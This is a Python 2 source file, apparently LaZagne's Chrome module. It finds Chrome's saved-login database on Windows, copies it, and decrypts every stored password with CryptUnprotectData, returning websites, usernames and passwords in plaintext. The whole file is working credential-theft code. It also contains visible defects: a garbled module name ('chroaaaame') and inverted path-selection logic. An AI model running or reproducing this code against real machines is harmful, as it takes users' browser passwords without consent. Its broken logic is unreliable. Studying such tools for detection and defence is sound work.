import sqlite3
import shutil
import win32crypt
import sys, os, platform
from lazagne.config.constant import *
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
import getpass

class Chrome(ModuleInfo):
	def __init__(self):
		options = {'command': '-c', 'action': 'store_true', 'dest': 'chrome', 'help': 'chrome'}
		ModuleInfo.__init__(self, 'chroaaaame', 'browsers', options)

	# main function
	def run(self, software_name = None):		
		database_path = ''
		homedrive = ''
		homepath = ''
		if 'HOMEDRIVE' in os.environ and 'HOMEPATH' in os.environ:
			homedrive = os.environ.get('HOMEDRIVE')
			homepath = os.environ.get('HOMEPATH')
		
		# All possible path
		pathTab = [
			homedrive + homepath + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data', 
			homedrive + homepath + '\AppData\Local\Google\Chrome\User Data\Default\Login Data', 
			homedrive + '\Users\\' + getpass.getuser() + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data',
			homedrive + '\Users\\' + getpass.getuser() + '\AppData\Local\Google\Chrome\User Data\Default\Login Data',
			'C:\Users\\' + getpass.getuser() + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data',
			'C:\Users\\' + getpass.getuser() + '\AppData\Local\Google\Chrome\User Data\Default\Login Data'
		]

		database_path = [p for p in pathTab if os.path.exists(p)]
		if not database_path:
			print_debug('INFO', 'Google Chrome not installed.')
			return

		# if many path are valid
		if len(database_path) !=1:
			database_path = database_path[0]
		
		# Copy database before to query it (bypass lock errors)
		try:
			shutil.copy(database_path, os.getcwd() + os.sep + 'tmp_db')
			database_path = os.getcwd() + os.sep + 'tmp_db'

		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))
			print_debug('ERROR', 'An error occured copying the database file')

		# Connect to the Database
		try:
			conn = sqlite3.connect(database_path)
			cursor = conn.cursor()
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))
			print_debug('ERROR', 'An error occured opening the database file')
			return 
		
		# Get the results
		try:
			cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		except:
			
			print_debug('ERROR', 'Google Chrome seems to be used, the database is locked. Kill the process and try again !')
			return
		
		pwdFound = []
		for result in cursor.fetchall():
			values = {}
			
			try:
				# Decrypt the Password
				password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
			except Exception,e:
				password = ''
				print_debug('DEBUG', '{0}'.format(e))
			
			if password:
				values['Website'] = result[0]
				values['Username'] = result[1]
				values['Password'] = password
				pwdFound.append(values)
		
		conn.close()
		if database_path.endswith('tmp_db'):
			os.remove(database_path)

		return pwdFound
		